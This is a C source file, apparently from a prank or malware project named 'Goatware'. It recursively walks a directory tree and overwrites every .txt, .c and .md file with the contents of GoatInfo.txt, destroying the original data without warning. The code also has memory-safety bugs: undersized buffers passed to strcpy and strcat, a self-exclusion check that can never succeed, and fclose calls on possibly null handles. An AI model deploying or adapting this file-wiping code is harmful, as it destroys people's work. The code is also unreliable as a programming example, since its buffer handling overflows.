/* Change the content of programs based on their file extension. */

#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <stdio.h>
#include <string.h>

void changeTxt(struct dirent *entry, const char *direct);
void changeC(struct dirent *entry, const char *direct);
void changeMd(struct dirent *entry, const char *direct);
void openDir(const char *direct, int level);

int main(void) {
	//Change first param of changeDir to a directory path to indicate which directory you want to explore
	openDir("test", 0);
	return 0;
}

void openDir(const char *direct, int level) {
	DIR *dir;
	struct dirent *entry;

	dir = opendir(direct);
	entry = readdir(dir);

	if (!dir)
		return;
	if (!entry)
		return;

	do {
		if (entry->d_type == DT_DIR) {
			// Skip if directory starts with a '.'			
			char name[strlen(entry->d_name)];
			strcpy(name, entry->d_name);
			char first = name[0];
			if (first == '.' || strcmp(name, "Goatware") == 0) {
				continue;
			}

			// Create directory address path		
			char directPath[1024];
			int length = snprintf(directPath, sizeof(directPath)-1, "%s/%s", direct, entry->d_name);
			directPath[length] = 0;

			if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
				continue;
			}

			openDir(directPath, level + 1);
		}
		else {
			/* Changes file if is a .txt, .c, or .md file */
			changeTxt(entry, direct); 
			changeC(entry, direct);
			changeMd(entry, direct);
		}
	} while (entry = readdir(dir));
	closedir(dir);
}

void changeTxt(struct dirent *entry, const char *direct) {

	// name[] is name of current file, checkName is last four characters of file to see if it is '.txt'
	int entryLength = strlen(entry->d_name);
	char name[entryLength];
	char checkName[5];			

	// Get last four characters of current file
	strcpy(name, entry->d_name);
	memcpy(checkName, &name[entryLength - 4], 4);
	checkName[4] = '\0';

	// Create address to .txt file			
	int addressLen = strlen(direct) + strlen(entry->d_name);
	char address[addressLen];
	strcpy(address, direct);
	strcat(address, "/");
	strcat(address, name);

	// Opens GoatInfo.txt and copies contents to selected file if it has .txt extension
	if (strcmp(checkName, ".txt") == 0) { 
		FILE *fp1, *fp2;
		char ch;
		if (strstr(address, "GoatInfo.txt") != NULL) {
			return;
		}
		fp1 = fopen("GoatInfo.txt", "r");				
		fp2 = fopen(address, "w+");

		if (fp1 != NULL && fp2 != NULL) {
			while (1) {
				ch = fgetc(fp1);
				if (ch == EOF) {
					break;
				} else {
					putc(ch, fp2);
				}
			}
		}
		fclose(fp1);
		fclose(fp2);
	}
}

void changeC(struct dirent *entry, const char *direct) {
	
	// name[] is name of current file, checkName is last two characters of file to see if it is '.c'
	int entryLength = strlen(entry->d_name);
	char name[entryLength];
	char checkName[3];			

	// Get last two characters of current file
	strcpy(name, entry->d_name);
	memcpy(checkName, &name[entryLength - 2], 2);
	checkName[2] = '\0';

	// Create address to .c file			
	int addressLen = strlen(direct) + strlen(entry->d_name);
	char address[addressLen];
	strcpy(address, direct);
	strcat(address, "/");
	strcat(address, name);

	// Opens GoatInfo.txt and copies contents to selected file if it has .c extension
	if (strcmp(checkName, ".c") == 0) { 
		FILE *fp1, *fp2;
		char ch;
		if (strstr(address, "changeFiles.c") != NULL && strstr(address, "renameProcess.c") != NULL) {
			return;
		}
		fp1 = fopen("GoatInfo.txt", "r");				
		fp2 = fopen(address, "w+");

		if (fp1 != NULL && fp2 != NULL) {
			while (1) {
				ch = fgetc(fp1);
				if (ch == EOF) {
					break;
				} else {
					putc(ch, fp2);
				}
			}
		}
		fclose(fp1);
		fclose(fp2);
	}
}

void changeMd(struct dirent *entry, const char *direct) {
	// name[] is name of current file, checkName is last three characters of file to see if it is '.md'
	int entryLength = strlen(entry->d_name);
	char name[entryLength];
	char checkName[4];			

	// Get last three characters of current file
	strcpy(name, entry->d_name);
	memcpy(checkName, &name[entryLength - 3], 3);
	checkName[3] = '\0';

	// Create address to .txt file			
	int addressLen = strlen(direct) + strlen(entry->d_name);
	char address[addressLen];
	strcpy(address, direct);
	strcat(address, "/");
	strcat(address, name);

	// Opens GoatInfo.txt and copies contents to selected file if it has .md extension
	if (strcmp(checkName, ".md") == 0) { 
		FILE *fp1, *fp2;
		char ch;

		fp1 = fopen("GoatInfo.txt", "r");				
		fp2 = fopen(address, "w+");

		if (fp1 != NULL && fp2 != NULL) {
			while (1) {
				ch = fgetc(fp1);
				if (ch == EOF) {
					break;
				} else {
					putc(ch, fp2);
				}
			}
		}
		fclose(fp1);
		fclose(fp2);
	}
}



